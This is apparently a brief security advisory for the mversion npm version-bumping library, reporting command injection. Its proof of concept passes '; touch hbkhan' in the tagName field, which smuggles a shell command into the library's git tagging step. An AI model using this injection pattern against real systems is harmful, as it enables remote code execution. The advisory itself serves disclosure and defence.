# Overview

mversion is a cross packaging manager module version handler/bumper.

This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.

# PoC

```javascript
// poc.js
// node poc.js

var mversion = require('mversion');

mversion.update({
       version: "major",
       commitMessage: "testing",
       tagName: "; touch hbkhan",
 })
```